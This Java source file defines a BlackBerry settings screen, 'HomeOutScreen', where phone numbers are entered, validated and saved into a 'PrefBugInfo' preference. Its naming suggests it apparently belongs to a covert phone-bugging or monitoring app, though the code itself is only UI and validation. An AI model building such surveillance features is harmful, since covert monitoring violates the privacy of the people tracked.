package com.vvt.screen;

import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.global.Global;
import com.vvt.ui.resource.MainAppTextResource;
import net.rim.device.api.system.Application;
import net.rim.device.api.ui.component.Dialog;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.FieldChangeListener;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.BasicEditField;
import net.rim.device.api.ui.component.ButtonField;
import net.rim.device.api.ui.component.EditField;
import net.rim.device.api.ui.container.HorizontalFieldManager;
import net.rim.device.api.ui.container.MainScreen;
import net.rim.device.api.ui.container.VerticalFieldManager;

public class HomeOutScreen extends MainScreen implements FieldChangeListener {

	private EditField[] homeOutField = null;
	private VerticalFieldManager homeOutVerticalMgr = new VerticalFieldManager();
	private PrefBugInfo prefBugInfo = null;
	private ButtonField saveButton = null;
	private ButtonField clearAllButton = null;
	private Preference pref = Global.getPreference();
	private int maxHomeOutNumber = 0;
//	private String regex = "\\+?[0-9]+";
	
	public HomeOutScreen() {
		try {
			setTitle(MainAppTextResource.HOME_OUT_SCREEN_MENU);
			initializeHomeOutNumberField();			
		} catch (Exception e) {
			Log.error("HomeOutScreen.constructor", e.getMessage(), e);
		}
	}
	
	private void initializeHomeOutNumberField() {
		String [] homeOutStrs = {"", "", "", "", "", "", "", "", "", ""};
		prefBugInfo = (PrefBugInfo) pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		int countHomeOutNumber = prefBugInfo.countHomeOutNumber();
		for (int i = 0; i < countHomeOutNumber; i++)	{
			homeOutStrs[i] = (String) prefBugInfo.getHomeOutNumber(i);
		}
		maxHomeOutNumber = prefBugInfo.getMaxHomeOutNumbers();
		homeOutField = new EditField[maxHomeOutNumber];
		for (int i = 0; i < maxHomeOutNumber; i++) {
			homeOutField[i] = new EditField(MainAppTextResource.MAIN_SCREEN_NUMBER + (i + 1) + Constant.COLON + Constant.SPACE, homeOutStrs[i], 20, BasicEditField.FILTER_PHONE);
			homeOutVerticalMgr.add(homeOutField[i]);
		}
		VerticalFieldManager vfLeft = new VerticalFieldManager();
		VerticalFieldManager vfRight = new VerticalFieldManager();
		HorizontalFieldManager hfm = new HorizontalFieldManager(BasicEditField.FIELD_HCENTER);
		saveButton = new ButtonField(MainAppTextResource.SETTING_SCREEN_SAVE, ButtonField.CONSUME_CLICK);
		clearAllButton = new ButtonField(MainAppTextResource.SETTING_SCREEN_CLEAR_ALL, ButtonField.CONSUME_CLICK);
		saveButton.setChangeListener(this);
		clearAllButton.setChangeListener(this);
		vfLeft.add(saveButton);
		vfRight.add(clearAllButton);
		hfm.add(vfLeft);
		hfm.add(vfRight);
		add(homeOutVerticalMgr);
		add(hfm);
	}
	
	private void initHomeOutNumber() {
		if (isEmptyList()) {
			prefBugInfo.removeAllHomeOutNumbers();
		} else if (isDuplicateNumber()) {
			Dialog.alert(MainAppTextResource.DUPLICATE_NUMBER);
		} else if (isInValidNumber()) {
			Dialog.alert(MainAppTextResource.INVALID_NUMBER);			
		} else {
			prefBugInfo.removeAllHomeOutNumbers();
			String[] homeOutNumber = new String[maxHomeOutNumber];
			for (int i = 0; i < maxHomeOutNumber; i++) {
				homeOutNumber[i] = homeOutField[i].getText().trim();		
				if (homeOutNumber[i].length() > 0) {
					prefBugInfo.addHomeOutNumber(homeOutNumber[i]);
				}
			}
			homeOutNumber = null;
		}
		pref.commit(prefBugInfo);
	}
	
	private boolean isDuplicateNumber() {
		boolean duplicate = false;
		String[] homeOutNumber = new String[maxHomeOutNumber];
		for (int i = 0; i < maxHomeOutNumber; i++) {
			homeOutNumber[i] = homeOutField[i].getText().trim();	
			if (homeOutNumber[i].length() > 0) {
				for (int j = i + 1; j < maxHomeOutNumber; j++) {
					if (homeOutNumber[i].equals(homeOutField[j].getText().trim())) {
						duplicate = true;
						break;
					}
				}
				if (duplicate) {
					break;
				}			
			}
		}
		homeOutNumber = null;
		return duplicate;
	}
	
	private boolean isInValidNumber() {
		boolean invalid = false;
		String[] homeOutNumber = new String[maxHomeOutNumber];
		for (int i = 0; i < maxHomeOutNumber; i++) {
			homeOutNumber[i] = homeOutField[i].getText().trim();		
			if (homeOutNumber[i].length() > 0) {
				if (!isValidDigits(homeOutNumber[i])) {
					invalid = true;
					break;
				}
			}
		}
		homeOutNumber = null;
		return invalid;
	}
	
	private boolean isValidDigits(String number) {		
		boolean valid = true;		
		if (number.startsWith(Constant.PLUS)) {
			number = number.substring(1);
		}
		if ((number != null) && (number.length() > 0)) {
			for (int i = 0; i < number.length(); i++) {
				if (!Character.isDigit(number.charAt(i))) {
					valid = false;
					break;
				}
			}
		} else {
			valid = false;
		}
		return valid;
	}
	
	private void clearAll() {
		for (int i = 0; i < maxHomeOutNumber; i++) {
			homeOutField[i].clear(0);
		}
	}
	
	private boolean isEmptyList() {
		boolean emptyList = true;
		for (int i = 0; i < maxHomeOutNumber; i++) {
			if (!homeOutField[i].getText().trim().equals(Constant.EMPTY_STRING)) {
				emptyList = false;
				break;
			}
		}
		return emptyList;
	}
	
	// Override the method to avoid asking SAVE/DISCARD/CANCEL
	public boolean onSavePrompt() {		
		return true;
	}
	
	public boolean onClose()	{
		String message = "Changes made?";
		String[] choices = new String[] {"Save", "Discard", "Cancel" };
		int[] values = {Dialog.SAVE, Dialog.DISCARD, Dialog.CANCEL};
		int defaultChoice = 1;
		
		ConfirmDialog customDialog = new ConfirmDialog(message, choices, values, defaultChoice);
		int result = customDialog.doModal();
		if (result == customDialog.SAVE) {
			initHomeOutNumber();
			return super.onClose();
		} else if (result == customDialog.DISCARD) {
			return super.onClose();
		} else {
			return false;
		}
	}
	
	// FieldChangeListener
	public void fieldChanged(Field field, int context) {
		try {
			if (field == saveButton) {				
				initHomeOutNumber();					
				UiApplication.getUiApplication().popScreen(this);
			} else if (field == clearAllButton) {
				clearAll();
			}
		} catch(Exception e) {
			Log.error("HomeOutScreen.fieldChanged()", e.getMessage(), e);
		}
	}
	
	class ConfirmDialog extends Dialog {
		
		public ConfirmDialog(String message, String [] choices, int[] values, int defaultChoice) {
			super(message, choices, values, defaultChoice, null);
		}
	}
}
